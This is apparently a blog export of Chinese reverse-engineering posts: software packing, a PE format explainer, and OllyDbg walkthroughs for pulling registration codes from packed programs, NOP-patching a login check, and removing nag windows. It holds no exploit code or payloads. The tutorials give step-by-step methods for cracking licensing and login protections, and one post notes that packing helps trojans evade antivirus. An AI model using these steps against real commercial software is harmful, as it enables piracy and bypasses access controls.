    <title><![CDATA[软件加壳技术]]></title>
    <url>%2F2017%2F05%2F06%2F%E8%BD%AF%E4%BB%B6%E5%8A%A0%E5%A3%B3%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[摘要加壳的全称应该是可执行程序资源压缩，压缩后的程序可以直接运行。加壳的一种常用的方式是在二进制的程序中植入一段代码，在运行的时候优先取得程序的控制权，之后再把控制权交还给原始代码，这样做的目的是为了隐藏程序真正的OEP（入口点，防止被破解）。大多数病毒就是基于此原理。加壳的程序需要阻止外部程序或软件对加壳程序本身的反汇编分析或者动态分析，以达到保护壳内原始程序以及软件不被外部程序破坏，保证原始程序正常运行。这种技术也常用来保护软件版权，防止软件被破解。但对于病毒，加壳可以绕过一些杀毒软件的扫描，从而实现它作为病毒的一些入侵或破坏的一些特性。 概念利用特殊的算法，对可执行文件里的资源进行压缩，只不过这个压缩之后的文件，可以独立运行，解压过程完全隐蔽，在内存中完成。它们附加在原程序上通过加载器载入内存后，先于原始程序执行，得到控制权，执行过程中对原始程序进行解密、还原，还原完成后再把控制权交还给原始程序，执行原来的代码部分。加上外壳后，原始程序代码在磁盘文件中一般是以加密后的形式存在的，只在执行时在内存中还原，这样就可以比较有效地防止破解者对程序文件的非法修改，同时也可以防止程序被静态反编译。 解压原理加壳工具在文件头里加了一段指令，告诉CPU，怎么才能解压自己。现在的CPU都很快，所以这个解压过程你基本分辨不出。软件一下子就打开了，只有你机器配置非常差，才会感觉到不加壳和加壳后的软件运行速度的差别。当你加壳时，其实就是给可执行的文件加上个外衣。用户执行的只是这个外壳程序。当你执行这个程序的时候这个壳就会把原来的程序在内存中解开，解开后，以后的就交给真正的程序。所以，这些的工作只是在内存中运行的。通常说的对外壳加密，都是指很多网上免费或者非免费的软件，被一些专门的加壳程序加壳，基本上是对程序的压缩或者不压缩。因为有的时候程序会过大，需要压缩。但是大部分的程序是因为防止反跟踪，防止程序被人跟踪调试，防止算法程序不想被别人静态分析。加密代码和数据，保护你的程序数据的完整性。不被修改或者窥视你程序的内幕。加“壳”虽然增加了CPU负担，但是减少了硬盘读写时间，实际应用时加“壳”以后程序运行速度更快（当然有的加“壳”以后会变慢，那是选择的加“壳”工具问题）。一般软件都加“壳”这样不但可以保护自己的软件不被破解、修改还可以增加运行时启动速度。加“壳”不等于木马，我们平时的绝大多数软件都加了自己的专用“壳”。RAR和ZIP都是压缩软件，不是加“壳”工具，他们解压时是需要进行磁盘读写，“壳”的解压缩是直接在内存中进行的。用RAR或者ZIP压缩一个病毒你试试，解压缩时杀毒软件肯定会发现。而用加“壳”手段封装木马，能发现的杀毒软件就少得多。木马加壳的原理很简单，在黑客营中提供的多数木马中，很多都是经过处理的，而这些处理就是所谓的加壳。当一个程序生成好后，很轻松的就可以利用诸如资源工具和反汇编工具对它进行修改，但如果程序员给程序加一个壳的话，那么至少这个加了壳的程序就不是那么好修改了，如果想修改就必须先脱壳。 分类加壳工具通常分为压缩壳和加密壳两类：压缩壳的特点是减小软件体积大小，加密保护不是重点。加密壳种类比较多，不同的壳侧重点不同，一些壳单纯保护程序，另一些壳提供额外的功能，如提供注册机制、使用次数、时间限制等。 常见的加壳技术压缩壳：UPX、北斗、ASDPack、Npack、PECompact等。加密壳：ASProtect、Xtreme-Protector、强壳Safengine、VMprotect、winlicense、Themida等。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OllyDebug-带壳破解某软件-获取注册码]]></title>
    <url>%2F2017%2F05%2F05%2FOllyDebug-%E5%B8%A6%E5%A3%B3%E7%A0%B4%E8%A7%A3%E6%9F%90%E8%BD%AF%E4%BB%B6-%E8%8E%B7%E5%8F%96%E6%B3%A8%E5%86%8C%E7%A0%81%2F</url>
    <content type="text"><![CDATA[首先使用查壳软件PEiD v0.98，查看下我们要破解的软件是否加壳了： 可以看到软件使用ASPack 2.12进行了加壳，本次我们暂时不进行脱壳，直接破解，获取软件的注册码，注意加壳的软件修改之后是不能保存的，只能通过脱壳之后在保存，或者是使用打补丁的方式。运行软件：软件标题栏提示为购买用户，点击购买，输入用户名和注册码：lzx，1111111111111111111111，然后点击注册验证，软件提示重启软件进行验证。能够得出的结论是，这是一款重启验证软件，本次我们输入用户名和注册码之后，软件会先将这两个参数存储，在软件重启的时候，会读取这两个值，进行验证。注意，这两个值可能存在软件安装目录的文件夹下，或者是被写入到注册表中。然后点击确定，软件退出。使用OD载入软件，提示软件代码段可能被压缩，证明软件被加了壳：点击确定或者取消进入OD，接着，F9运行软件，然后Ctrl+G，跟随表达式到“0X00401000”处：在上图中，反汇编窗口处，右键-&gt;分析-&gt;从模块中删除分析：（注意：本步骤中，之所以需要先运行程序，是因为程序加了壳，首先运行程序，程序或先将压缩壳脱去，如果不先运行程序，直接Ctrl+G跟随的话，代码还有脱去压缩壳）（注意：不是所有的程序都是在0X401000处，但是大多数程序的入口段都是在这个位置，除非开发人员特意修改）到上图所示的界面，基本上就能判断程序已经加压缩了，脱去了壳。脱去壳之后，就来到了代码段，选择搜索字符串，智能搜索，关键字：未购买双击未购买用户，转入反汇编窗口，查找代码上文的内容，看没有关键跳和关键CALL，很巧，找到一个读取注册表的代码：在注册表出下断点，初步判断软件在重启的时候，在这个代码处读取注册表中的数据，也就是用户输入的用户名和注册码。下断点之后，重新载入程序，程序会提示断点丢失，这是因为程序加了壳的缘故，不要紧，断点在B标签中能够查看到。然后设置API断点，菜单栏-&gt;插件-&gt;API断点设置工具-&gt;常用断点设置：这个断点会在程序解码之后，但是还没有运行起来的时候中断。这个时候程序还没有进行注册码的判断，所以在这个时候设置断点。然后F9运行程序，程序在断点处停下：切换到断点窗口：将之前的读取注册表的断点激活，禁止掉初始化的断点。然后F9运行程序，程序停在了读取注册表的地方：然后我们单步执行F8，注意观察CPU寄存器和堆栈窗口中的数据，能够看到读取的我们之前填入的用户名和注册码，以及软件根据我们用户名生成的正确的注册码：继续向下执行：这个注册码就是对应我们用户名正确的注册码了，记录下来，等会进入软件进行注册。程序后面就是进行注册码的对比了，会有关键CALL和关键跳，但是程序加了壳，我们无法保存修改，所以暂时不用这种方法，（加壳程序可以通过打补丁的方式爆破），我们使用正确的注册码使用软件。关闭OD，使用之前的用户名和现在正确的注册码进行注册： 总结：1.很多软件都会加壳，使用PEiD v0.98进行查壳；2.软件未脱壳的情况下，需要先F9运行软件之后，才能做后面的操作；3.很多软件都使用重启验证的方式，这些信息一般会存在软件的安装目录的配置文件中或者是注册表中；4.找到读取注册表或者配置文件的代码段，单步执行，注意观察CPU寄存器窗口和堆栈窗口，软件会根据用户名生成正确的注册码，注意多单步运行几次，记录下所有敏感的字符串。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>OllyDebug</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OllyDebug-某本地管理软件登录破解]]></title>
    <url>%2F2017%2F05%2F04%2FOllyDebug-%E6%9F%90%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%E7%99%BB%E5%BD%95%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[首先，打开软件，提示我们输入密码登录系统： 随便输入错误的密码进行获取到出错关键字，如上图所示：“用户密码错误还有2机会！”接着使用OD载入软件：反汇编窗口-&gt;中文搜索引擎-&gt;智能搜索：程序转入到搜索界面，Ctrl+F,搜索之前获取到得关键字“密码”，如上图所示，定位到该行，双击该行，转入反汇编窗口：注意观察代码上文的跳转：如上图所示，我们能看到显示错误信息的过程是从上面jnz short Protecti.00539AF3跳转而来，双击该行，或者选中该行按下F2下断点，然后F9全速运行程序：输入错误的密码，程序会停在之前设置的断点处：同时，在信息窗口中，我们可以看到跳转以实现，证明下一步就将跳转到提示错误信息的代码处执行：接着，我们双击CPU状态寄存器的Z标志位，翻转Z标志位的值：信息窗口的跳转页变为了“跳转未实现”，F9，全速运行程序：进入程序，可以看到已经绕过了登录界面的验证，证明我们之前找到的跳转是关键跳，接着返回OD，我们的目的是禁止掉那个跳转，方法是选中跳转指令行，右键-&gt;二进制-&gt;使用nop填充：然后保存程序：反汇编窗口右键-&gt;复制到可执行文件-&gt;所有修改：在弹出的新窗口中，右键-&gt;保存文件：将文件另存为就可以了，运行刚才保存的程序，可以看到不用输入密码，直接点登陆就能进入程序： 总结：本次破解的关键点是查找敏感字符串，然后在关键字符串附件找到关键跳和关键CALL。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>OllyDebug</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OllyDebug-软件破解常用方法]]></title>
    <url>%2F2017%2F05%2F03%2FOllyDebug-%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[第一、二课：修改跳转语句–查找关键字符串运行程序，查找登录失败的关键字，在反汇编窗口右键-&gt;中文搜索引擎-&gt;智能搜索中Ctrl+F查找关键字，然后双击跳转到反汇编窗口，一般在关键字前后会有一个验证密码之后的跳转，找到关键的跳转语句，如果密码输入错误，程序跳转的话，我们可以选中该跳转语句，右键-&gt;二进制-&gt;使用Nop指令填充跳转语句，不让程序跳转，反之，如果输入密码错误，程序不跳转，我们可以选中跳转语句，按下空格，将条件跳转语句改为jmp，无条件跳转，修改的跳转语句后面数字为虚拟地址，注意是十六进制格式，可以删除前面的X或者加上0X前缀。调试过程中，可以找到条件跳转语句下断点，观察程序的执行流程。 第三课：壳中寻找注册码软件在注册的时候，一般需要用户输入用户名和注册码，注意，用户名和注册码是对应的，唯一的用户名对应唯一的注册码。输入用户名和注册码进行注册（记住输入的错误测试注册码），软件提示重启软件进行验证，这种方式的软件一般都是将刚才的用户输入的用户名和注册码写入注册表，然后软件在重启的时候，读取注册表中的数据，进行注册码比对。使用OD载入程序，如果程序加壳了，可以在反汇编窗口，右键-&gt;分析-&gt;从模块中删除分析：如果程序当前是在内核空间，需要让程序运行到代码空间，Ctrl+G到0X00401000，然后搜索关键字符串“未购买”，跳转到反汇编窗口，会发现代码上面会有查找注册表的代码，可以在读取注册表处下断点。由于软件加壳，这里设置的断点查找不到了，解决办法是，使用OD自带的插件API断点设置工具，选中取初始化断点：在程序初始化之前，断掉程序，这个断点之前程序已经解码，但是还未运行起来。然后单步运行程序，注意观察堆栈窗口中的内容，可以看到程序在读取注册表中之前输入的用户名和注册码，并且会生成正确的注册码进行比对，记下这个注册码。继续执行代码，后面会有判断的语句，其实可以直接修改让他跳过错误提示，但是这个是加壳的程序，修改无法保存。所以选择记录正确注册码的方式来破解。加壳的程序可以使用打补丁的方式破解。 第四课：文件自校验很多程序为了防止被人破解，一般会加壳，但是总有办法可以脱壳，软件进一步的防御是使用文件大小自校验，如果文件的大小被改变了，那么自动终止程序，这个自校验一般在程序开始处判断，找到这个判断，NOP掉。如果遇到程序脱壳之后不能运行的情况，可能就是程序加入了文件自校验。 第五课：关键跳和关键CALL，修改关键CALL进行破解影响关键跳的，一般是上面关键CALL执行，CALL调用函数执行的返回值影响关键跳，如果直接修改关键跳可能只绕过一个跳转，需要根本的破解，建议还是从关键CALL处理。软件可能有很多处调用关键CALL，来判断软件是否注册，我们只需要修改一个关键CALL就可以了。修改关键CALL，可以使用F7跟进去，直接修改函数，将关键的返回值翻转就可以了，然后加入retn。 第六课：VMP壳爆破跟第三课类似，跳转到用户空间，查找关键字符串，找到关键CALL和关键跳。 第七课：VMP壳程序查找注册码有些程序启动的时候就要求用户注册，用户输入用户名和注册码之后，提示重启软件，软件重启会读取一个配置文件，这个配置文件里存储的就是我们刚才输入的用户名和注册码，程序读取之后与正确的注册码对比。跳转到0X00401000处用户空间，查找关键字符串。在关键跳转处下断点，运行程序，主要观察堆栈窗口的关键字符串，可能就是正确的注册码。注意带壳的程序修改之后无法保存，可以通过打补丁的方式修改。 第八课：API断点-MessageBoxA断点一般是通过查找字符串的方法，找到弹窗，有的程序对字符串进行了加密，所以查找字符串的方法就行不通了，使用OD的插件BP，在所有MessageBoxA处下断点：点击MessageBoxA就可以在所有的弹窗之前下断点。调试小技巧：如下图所示，注意观察箭头所指向的地方为跳转标志，一个是跳转起点，一个是跳转终点，选中跳转终点，在信息窗口会显示跳转来自哪里，点击信息窗口中的代码行，右键，可以直接转到跳转起点处：EIP：指令指针寄存器，在寄存器窗口，双击该寄存器，程序能够快速定位到当前代码执行的地方： 第九课：API断点-INI文件读取断点跟第七课类似，软件提示输入注册码，重启验证，重启是会读取ini配置文件，可以使用OD自带的插件：程序运行之后，会停在断点处，这个断点一般都在内核空间，可以点击菜单栏中的调试-&gt;执行到代码空间，也就是用户空间进行下一步操作：判断在用户空间还是内核空间，可以通过查看地址的方式，也可以通过查看程序标题上的提示：上图所示是在用户空间，如果是内核空间，一般是kernal…等。内核空间的代码是无法修改的。 第十课：万能断点？ 第十一课：VB程序破解注意VB编写的程序API断点、关键CALL返回值、MessageBoxA等都不适用。VB程序特性：特征参数：MSVBVM60…VB程序中注册错误弹窗的断点，可以在这里设置：类似于MessageBoxA的断点，然后在找关键跳和关键CALL破解，注意内核空间的代码是不能修改的。返回到用户空间找关键跳和关键CALL。 第十二课：取出NAG窗口找到NAG窗口的办法有两种，第一种：使用查找关键字的方法；第二种：使用暂停法。使用OD载入程序，F9运行程序，弹窗触发之后，暂时先不要点击是或者否关闭窗口，先切换到OD，暂停程序运行，然后点击k，切换到堆栈窗口，堆栈窗口中，显示程序调用的函数或者方法，找到MessageBoxA，双击该行，返回到反汇编窗口，设置断点，重新载入程序在程序的上文找关键跳，如果找不到关键跳，尝试直接F8单步运行，走出当前的函数，可能是在外面的函数调用了弹窗函数。本方法中，暂停程序之后，可以回到软件，点击是或者否关闭弹窗，OD中指针也会跳转到弹窗函数调用完成的下一条指令。 第十三课：VB程序查找注册码-搜索字符串方法使用Detect it easy 0.64可以查找软件的开发语言。无视壳。VB语言开发的程序使用的是unicode编码，所以在查找字符串的时候，需要使用查找unicode，使用ASCII是查找不到的。智能搜索可以查找。关键跳的上面一个CALL就是关键CALL。 第十四课：BC++程序脱壳？BC++程序，脱壳之后，可能无法运行，需要手动查找,手动修复IAT地址，也有可能是程序有自校验，但是可能性很小。 第十五课：DEDE程序载入BC++编写的程序，进行静态分析，找到按钮事件的代码的段首地址，然后OD载入程序，找到段首设置断点进行调试。DED适用于BC++和Delphi编写的程序。 第十六课：LOOPD：汇编循环指令，遇到循环指令的情况，我们可以在循环的下面的代码处设置断点，让程序走到断点处，快速执行完循环。也可以让程序运行到光标处，快捷键是F4，运行到选定位置。 第十七课：重启验证的程序，破解需要找到关键CALL和关键跳，但是主要的是需要找到关键CALL，修改CALL的返回值，因为如果只是修改了关键跳，本次运行程序，提示注册成功，但是程序需要重启验证，那还是没有完成注册和破解。 第十八课：补丁生成方法 第十九课：网络验证程序破解–易语言程序60%的外挂程序使用易语言编写。使用OD载入程序，没有任何弹窗，表明程序没有加壳，Ctrl+G，跳转到0X00401000用户空间，在反汇编窗口右键-&gt;查找-&gt;二进制字符串，在HEX栏输入“FF 25”，注意查找易语言按钮事件的时候，是查找“FF 55”，查找窗体是搜索“FF 25”,只有易语言编写的程序才有：注意前面的一个push，上面一行的push就是窗体事件，通过改变后面的值，就能加载不同的窗体，使用此方法可以绕过软件开始的验证窗体。接着查找其他窗体：在反汇编窗口中，右键-&gt;查找-&gt;命令，“push 10001”，在查找到的内容下面，会有其他的push语句，下面一条push xxxxxx（内存地址），就是一个窗体，使用这个地址替换掉上图中查找到的第一个加载的窗体，来达到绕过登录验证的效果。一个程序会有很多窗体，查找替换，找到想要的那一个。此方法的弊端：可能出现蓝屏、格盘、关机等等，最好在虚拟机中进行。 第二十课：易语言程序-暗桩push窗体请谨慎使用，可能软件开发者会设置很多暗桩。危害很大，蓝屏、格盘，关机等等。暗桩：可以理解为一些隐藏的功能，可以是攻击破解者电脑的功能，使用上节课的方法弄出来的很多窗口，可能发现有的打不开，那是因为某些窗体需要父窗体。使用上节课中的方法找到主窗体，如果窗体不能打开，或者打开直接退出了，那就是遇到了暗桩，使用OD载入程序调试，如果启动程序之后，程序马上自己结束了，这就是一个没有危害的暗桩，调试方法是设置API断点，菜单栏-&gt;插件-&gt;API断点设置工具-&gt;常用断点设置：让程序运行知道停止在断点处，这个时候在堆栈窗口中，可以看到“返回到…”，选中该行，右键-&gt;反汇编窗口中跟随，在汇编窗口中，能够找到介绍程序的调用和关键跳等。 第二十一课：网络验证判断方法：如果是本地验证，那么注册失败的弹窗应该是很快弹出的，如果是网络验证，会有一小段时间的延迟，可以察觉到。网络验证也可以本地爆破。 第二十二课：VB程序对按钮事件进行下断点，可以使用脚本，方法：反汇编窗口右键-&gt;运行脚本-&gt;打开-&gt;VB程序按钮事件。VB程序注意查找0xFFFF，一般有关键跳。 第二十三课：取消关机：shutdown -a 第二十四课：工具修改软件字符串。 第二十五课：修改OD，使用Ueditor编辑器，搜索字符串，OD标题，修改就好了。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>OllyDebug</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PE文件结构]]></title>
    <url>%2F2017%2F05%2F02%2FPE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[什么是PE文件？PE（Portable Execute）文件是Windows下可移植可执行文件的总称，常见的有DLL，EXE，OCX，SYS等，事实上，一个文件是否是PE文件与其扩展名无关。本文要说的PE文件结构，就是指的Window可移植可执行文件结构。 PE文件结构PE文件具有较强的移植性；PE结构是一种数据组织方式；PE结构主要应用于windows系统；具有PE结构的文件称为PE文件；EXE、DLL都是PE文件； 一个完整的PE文件主要有4个部分组成：DOS头，PE头，节表以及节数据。1.Dos部分主要用来对非FE格式文件的处理，DOS时代遗留的产物，是PE文件的一个遗传基因;2.PE头部分用于宏观上记录文件的一些信息，，运行平台，大小，创建日期，属性等。3.节表部分用于对各中类型的数据进行定义分段;4.节数据不言而喻就是文件的数据部分，实际上我们编写程序的过程中就是对该部分的数据进行编写。而其他的部分则是由编译器依照我们编写的部分进行相应的填写而得到的。上图从下往上看，该结构清晰的描述了各个数据块在pe文件中的排列顺序和部分数据块之间的关联方式。 Dos部分DOS部分由如下两部分构成：Dos头和Dos块。Dos头：长度40h；Dos块：长度不定，DOS插桩代码，是DOS下的16位程序代码，只是为了显示上面的提示数据。这段代码是编译器在程序编译过程中自动添加的。Dos头对于非pe结构的文件将指引dos可执行程序部分，也就指引到dos块。而对于PE结构的文件将指引到PE结构部分。具体如何指引是通过dos头结构进行指定的。 Dos结构定义这里是对dos头结构的完整定义，该字段的长度固定为40h。第一项是字段的名称，第二项是字段的大小，第三项是字段的是数据内容。对于研究PE结构而言，该结构的定义中对我们有意义的字段只有最后一个（也就是红色的那一行），该字段的内容是一个长度为4个字节的地址，用于指向PE结构部分。dosHeader-&gt;e_lfanew是DWORD类型,指出真正PE头相对于文件基地址的偏移值，即偏移多少个字节。该字段在文件中如何查找，需要计算该字段E_lfanew的偏移（就是3Ch）。偏移的计算方法很简单，就是计算从结构头部到该字节的长度。找到Dos头的地址，然后加上偏移量3Ch就是e_lfanew的地址。或者使用OlluDebug查看：我们已经知道dos头部分的长度是40h，其后面紧跟的就是dos块部分，而dos块的长度则是不固定的。它起始于dos头的结束位置，结束于pe头开始之前。也就是说，位于dos头和pe头之间的数据就是dos块。下图中被选中的部分就是dos块。Dos块：长度不定，DOS插桩代码，是DOS下的16位程序代码，只是为了显示上面的提示数据。这段代码是编译器在程序编译过程中自动添加的。 PE头部分PE头的三个构成部分：PE标志位，长度4H（4个字节）文件头，长度14H（20个字节）可选头，长度E0H（224个字节）PE header 是真正的Win32程序的格式头部，其中包括如下：PE标志位：共有4个字节的长度，用来判断文件是否为pe文件的标识。PE文件该字段的值固定为00004550，在字符串中看到的数据为“PE..”文件头：共占有14H个字节的长度，主要记录该文件的一些调试信息。可选头：长度为E0H个字节。该部分虽然叫可选头，PE文件中不可或缺的一部分。文件在装入内存时，主要的参照的就是该结构。文件在从源代码进行编译的时候也主要是对该部分进行填写。并在生成的时候依照该结构的一些字段的设置。（ PE表头内含的重要信息包括程序代码和资料区域的大小位置、适用的操作系统、堆栈（stack）的最初大小等等。 ）上面的图显示的是各个数据块的情况。红色方框圈起来的是pe标志位（4字节），PE文件头标志 :“PE\0\0”。在开始DOS header的偏移3CH处所指向的地址开始 。粉色方框内的数据是PE文件头部分（20字节），IMAGE_FILE_HEADER FileHeader；PE文件物理分布的信息 。下面最大的那一部分是可选头部分，IMAGE_OPTIONAL_HEADER32 OptionalHeader；PE文件逻辑分布的信息 。 文件头结构定义20个字节，对应的结构体名字：IMAGE_FILE_HEADER STRUCT从结构的定义可以看到第二个字段是当前PE文件的节的数目。Machine：指出该文件运行所需的CPU。NumberOfSections：文件的节数目。Characteristics文件属性：区分文件是exe还是dll等。 可选头定义对应的结构体名字：IMAGE_OPTIONAL_HEADER32 STRUCT由于可选头字段数目多达32个，这里没有对全部字段的定义进行列举，只列举了几个相对重要的一些字段（12个）。DWORD AddressOfEntryPoint；//PE装载器准备运行的PE文件的第一个指令的RVA，若要改变整个执行的流程，可以将该值指定到新的RVA，这样新RVA处的指令首先被执行。DWORD SectionAlignment; //块对齐DWORD FileAlignment; //文件块对齐（其中注释部分前面的16进制数据是该字段相对于PE头的偏移量。）“RVA”：全名是“Relative Virtual Address”，翻译过来是“相对虚拟地址”。但该地址在用16进制工具打开磁盘文件后得到的数据中并不能找到。这是因为RVA是一个内存地址，我们打开的磁盘中的文件是找不到该地址的。 使用动态调试工具可以看到，如OD：PE文件中的许多字段内容都是以RVA表示。一个RVA是某一资料项的offset（偏移）值 – 从文件被映像进来的起点算起。举个例子，我们说Windows加载器把一个PE档映像到虚拟地址空间的 0x400000 处，如果此image有一个表格开始于0x401464，那么这个表格 RVA就是0x1464：虚拟地址 0x401464 - 基地址 0x400000 = RVA 0x1464 只要把RVA加上基地址，RVA就可以被转换为一个有用的指针。由于内存中和文件中节对齐粒度不同，同一数据相对于文件头的偏移量在内存中和在磁盘文件中可能是不同的，为了提高程序执行的效率，PE文件头中使用的都是内存映像中的偏移量，也就是RVA。 注意，可选头的最后一个字段是一个结构体：DataDirectory IMAGE_DATA_DIRECTORY 16 dup(&lt;&gt;) ;0078h该结构体定义如下：IMAGE_DATA_DIRECTORY STRUCT VirtualAddress DWORD ? ；数据的起始RVA Size DWORD ? ；数据块的长度大小IMAGE_DATA_DIRECTORY ENDS分别定义一个数据的起始地址，另一个是定义一个数据块的长度。 可选头中定义了如下重要信息： 所有含代码的节的总大小 所有含已初始化数据的节的总大小 所有含未初始化数据的节的大小 程序执行入口RVA 代码的节的起始RVA 数据的节的起始RVA 程序的建议装载地址 内存中的节的对齐粒度 文件中的节的对齐粒度 内存中整个PE映像尺寸 所有头＋节表的大小 导出表 导入表 资源 重定位表 调试信息 版权信息 导入函数地址表 节表节表：PE代码和数据的结构数据，指示装载系统代码段在哪里，数据段在哪里等。PE文件中所有节的属性都被定义在节表（段表）中，节表是一个由IMAGE_SECTION_HEADER结构组成的数组，每个结构用来描述一个节。我们来分析一下这个结构。结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。全部有效结构的最后以一个空的IMAGE_SECTION_HEADER结构作为结束，所以节表中总的IMAGE_SECTION_HEADER结构数量等于节的数量加一。节表总是被存放在紧接在PE文件头的地方，也就是从PE文件头开始的偏移为00f8h的地方。（注意：不是文件本身的头部，由于程序的dos块的大小并不是固定的，所以导致PE头相对于mz头的偏移变化的。 所以我们在计算偏移的时候，对于PE头后面的数据都习惯用相对于PE头的偏移，PE头大小是固定的的。）在文件头中已经定义了文件的节的数目：0ah个，那么该文件的节表共有11个IMAGE_SECTION_HEADER结构。 节数据常见的节数据：.text：代码段，是在编译或汇编结束时产生的一种块，它的内容全部是指令代码。也有的编译器将该段命名为.code.data：初始化的数据块，是初始化的数据块，包含那些编译时被初始化的变量、字符串.idata：输入表，包含其他外来dll的函数和数据信息，也就是输入表，也有人称之为导入表。.rsrc：资源数据块，包含模块的全部资源数据，如图标、菜单、位图等。.reloc：重定位表，用于保存基址的重定位表。即当装在程序不能按照连接器所指定的地址装载文件是，需要对指令或已经初始化的变量进行调整，该块中也包含了调整过程中所需要的一些数据，如果装载能够正常装在则忽略此段中的数据。.edata：导出表，是pe文件的输出表，以供其他模块使用，并不是每个pe文件都有此数据段，因为有的文件并不需要输出一些函数，该数据段常见于动态连接库文件中。.radata：存放调试目录、说明字符串，该数据块并不常见主要是用于存放一些调试信息。 导入表导入表由一系列的IMAGE_IMPORT_DESCRIPTOR结构组成，结构的数量取决于程序要使用的DLL文件的数量，每个结构对应一个DLL文件，例如，如果一个PE文件从10个不同的DLL文件中引入了函数，那么就存在10个IMAGE_IMPORT_DESCRIPTOR结构来描述这些DLL文件，在所有这些结构的最后，由一个内容全为0的IMAGE_IMPORT_DESCRIPTOR结构作为结束。IMAGE_IMPORT_DESCRIPTOR STRUCT union Characteristics DWORD ? OriginalFirstThunk DWORD ? ；指向被调函数名的指针数组的指针 ends TimeDateStamp DWORD ? ；时间日期记录，无实际意义，可忽略 ForwarderChain DWORD ? ；正向连接索引 Name1 DWORD ? ；指向被调用dll的名字指针数组的指针 FirstThunk DWORD ? ；指向被调函数地址的指针数组的指针IMAGE_IMPORT_DESCRIPTOR ENDSForwarderChain：当程序调用一个dll中的函数A，而函数A又需要调用其他dll中的函数B时使用该字段。这种情况很少见，该字段也就很少被用到。一般为0。FirstThunk：该字段在文件中看到的数据是和第一个字段OriginalFirstThunk是一样的，这里之所以叫做地址是由于程序加载到内存后是会对该字段重写，将地址写入到这里。 导出表IMAGE_EXPORT_DIRECTORY STRUCT Characteristics DWORD ? ；未使用，总是为0 TimeDateStamp DWORD ? ；文件的产生时刻 MajorVersion WORD ? ；未使用，总是为0 MinorVersion WORD ? ；未使用，总是为0 nName DWORD ? ；指向文件名的RVA nBase DWORD ? ；导出函数的起始序号 NumberOfFunctions DWORD ? ；导出函数的总数 NumberOfNames DWORD ? ；以名称导出的函数总数 AddressOfFunctions DWORD ? ；指向导出函数地址表的RVA AddressOfNames DWORD ? ；指向函数名地址表的RVA AddressOfNameOrdinals DWORD ? ；指向函数名序号表的RVAIMAGE_EXPORT_DIRECTORY ENDS nName字段：这个字段是一个RVA值，指向一个定义了模块名称的字符串。这个字符串说明了模块的原始文件名，比如说即使Kernel32.dll文件被改名为Ker.dll，仍然可以从这个字符串中的值得知它被编译时的文件名是“Kernel32.dll”。NumberOfFunctions字段：文件中包含的导出函数的总数。NumberOfNames字段：被定义了函数名称的导出函数的总数。显然，只有这个数量的函数既可以用函数名方式导出，也可以用序号方式导出，剩下的NumberOfFunctions减去NumberOfNames数量的函数只能用序号方式导出。NumberOfNames字段的值只会小于或者等于NumberOfFunctions字段的值，如果这个值是0，表示所有的函数都是以序号方式导出的。AddressOfFunctions字段：这是一个RVA值，指向包含全部导出函数入口地址的双字数组，数组中的每一项是一个RVA值，数组的项数等于NumberOfFunctions字段的值。nBase字段：导出函数序号的起始值。将AddressOfFunctions字段指向的入口地址表的索引号加上这个起始值就是对应函数的导出序号，举例来说，假如nBase字段的值为x，那么入口地址表指定的第一个导出函数的序号就是x，第二个导出函数的序号就是x＋1，总之，一个导出函数的导出序号等于nBase字段的值加上其在入口地址表中的位置索引值。AddressOfNames和AddressOfNameOrdinals字段：AddressOfNames字段的数值是一个RVA值，指向函数名字符串地址表，这个地址表是一个双字数组，数组中的每一项指向一个函数名称字符串的RVA，数组的项数等于NumberOfNames字段的值，所有有名称的导出函数的名称字符串都定义在这个表中。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OllyDebug-去除NAG窗口]]></title>
    <url>%2F2017%2F05%2F01%2FOllyDebug-%E5%8E%BB%E9%99%A4NAG%E7%AA%97%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[NAG本意是烦人的意思，NAG窗口是软件设计者用来时不时提醒用户购买正版的警告窗口。一般情况下，一个注册后的软件，是不会弹出NAG窗口的。所以，一般在程序启动的时候，会有一段代码检查改程序是否已经被注册，我们可以把这个程序的注册破解掉，NAG窗口即会自动消失。 运行程序：今天的目的是去除打开程序时的弹窗和关闭程序时的弹窗。 使用OllyDebug载入程序：正常运行程序，会调用MessageBoxA函数来弹出窗口，而上面的跳转je没有执行：je跳转的条件不满足，所以没有跳转，将je改为jmp，无条件跳转，就可以跳过第一个弹窗。方法1：将“je”改为“jmp”： 方法2：将如下部分全部用“nop”指令替换：右键-&gt;二进制-&gt;使用nop填充： 方法3：修改程序的入口点，跳过前面的弹窗部分。 使用上面两种方法将两个弹窗修改掉，然后保存文件即可。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>OllyDebug</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OllyDebug-暴力破解TraceMe]]></title>
    <url>%2F2017%2F05%2F01%2FOllyDebug-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3TraceMe%2F</url>
